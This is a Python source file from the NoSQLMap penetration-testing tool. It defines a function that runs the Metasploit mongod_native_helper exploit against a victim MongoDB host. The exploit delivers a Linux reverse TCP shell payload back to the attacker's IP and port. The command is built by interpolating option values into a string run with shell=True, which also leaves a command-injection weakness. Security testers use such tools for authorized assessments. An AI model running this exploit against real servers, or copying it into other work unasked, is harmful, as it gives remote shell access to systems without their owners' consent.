#!/usr/bin/python
# -*- coding: UTF-8 -*-

#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

import subprocess
from log import Logger
from exceptions import MinParametersViolation

def metasploitMongoShell(options):
    '''requires a victim, my own ip and my port'''

    if options.victim=="" or options.myIP=="" or options.myPort<0:
        raise MinParametersViolation
    cmd = "msfcli exploit/linux/misc/mongod_native_helper RHOST=%s DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=%s LPORT=%s E" %(options.victim, options.myIP, options.myPort)
    try:
        proc = subprocess.call(cmd, shell=True)
    except OSError,e:
        Logger.error("Something went wrong while calling mongoshell exploit.\n"+e)
